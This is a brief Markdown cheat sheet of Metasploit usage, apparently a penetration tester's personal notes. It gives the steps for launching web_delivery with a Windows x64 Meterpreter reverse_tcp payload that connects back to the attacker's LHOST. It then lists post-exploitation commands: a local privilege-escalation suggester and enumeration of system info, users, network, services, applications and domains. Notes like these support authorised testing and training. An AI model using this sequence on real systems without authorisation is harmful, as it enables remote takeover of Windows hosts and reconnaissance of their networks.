# metasploit

## where all modules are located:

```
/usr/share/metasploit-framework/modules
```

## meterpreter

```bash
msfconsole
```

```
use exploit/multi/script/web_delivery
```

```
set payload windows/x64/meterpreter/reverse_tcp
```

```
set target 2
```

```
set LHOST eth0
```

```
run
```

## meterpreter cool stuff

```
post/multi/recon/local_exploit_suggester
```

## enumeration with metasploit

* `sysinfo` - get system information
* `getuid` - get current user that shell is living in
* `ipconfig` - view IP addresses
* `arp` - view ARP cache
* `run post/windows/gather/enum_services` - view running services
* `run post/windows/gather/enum_applications` - view installed applications
* `run post/windows/gather/enum_domains` - view domains (might crash)
* `route`

